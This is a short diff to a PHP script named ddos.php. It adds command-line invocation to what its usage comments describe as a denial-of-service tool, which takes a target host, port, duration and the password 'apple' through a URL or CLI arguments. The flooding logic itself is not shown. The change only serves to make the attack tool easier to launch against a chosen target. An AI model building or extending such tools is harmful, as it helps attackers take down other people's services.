@@ -1,5 +1,10 @@
 <?php
-//Usage: http://127.0.0.1/ddos.php?pass=apple&host=DDoSTarget&port=PORT&time=SECOND
+//Server Usage:	http://127.0.0.1/ddos.php?pass=apple&host=DDoSTarget&port=PORT&time=SECOND
+//CLI Usage:		php ./ddos.php host=DDoSTarget port=PORT time=SECOND pass=apple
+
+if(isset($argv)) {
+    parse_str(implode('&', array_slice($argv, 1)), $_GET);
+}
 
 if(isset($_GET['host'])&&isset($_GET['time'])&&isset($_GET['pass'])){
 	
